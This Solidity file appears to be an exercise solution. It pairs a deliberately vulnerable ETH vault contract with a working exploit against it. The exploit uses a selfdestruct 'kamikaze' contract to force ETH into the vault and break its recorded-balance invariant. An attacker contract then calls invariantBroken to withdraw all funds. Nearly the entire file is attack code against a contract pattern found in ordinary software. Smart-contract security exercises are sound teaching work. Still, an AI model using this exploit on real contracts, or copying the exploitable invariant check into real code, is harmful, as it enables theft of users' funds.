pragma solidity ^0.4.24;

//*** Exercice 11 ***//(removed in latest version)
// You can store ETH in this contract and redeem them.
contract VaultInvariant {
    mapping(address => uint) public balances;
    uint totalBalance;
     /// @dev Store ETH in the contract.
    function store() payable {
        balances[msg.sender]+=msg.value;
        totalBalance+=msg.value;
    }

    /// @dev Redeem your ETH.
    function redeem() {
        uint toTranfer = balances[msg.sender];
        msg.sender.transfer(toTranfer);
        balances[msg.sender]=0;
        totalBalance-=toTranfer;
    }

    /// @dev Let a user get all funds if an invariant is broken.
    function invariantBroken() {
        require(totalBalance!=this.balance);

        msg.sender.transfer(this.balance);
    }

}

contract kamikazeAttack {
    constructor(address _victim) public payable {
        selfdestruct(_victim);
    }
}

contract VaultInvariantAttack {

    VaultInvariant victim;

    constructor(address _victim) public {
        victim = VaultInvariant(_victim);
    }

    function() external payable {

    }

    //exploit works when victim.balance is different from stored balance invariant
    // "totalBalance". Forcing some value into the victim contract is enough to then
    //allow withdrawing its funds
    function attack() external payable returns(bool success) {
        address attacker = (new kamikazeAttack).value(msg.value)(address(victim));
        victim.invariantBroken();
        return true;
    }

    function getBalance() external view returns(uint256 localBalance, uint256 remoteBalance) {
        return (address(this).balance, address(victim).balance); //victim should be zero
    }

}
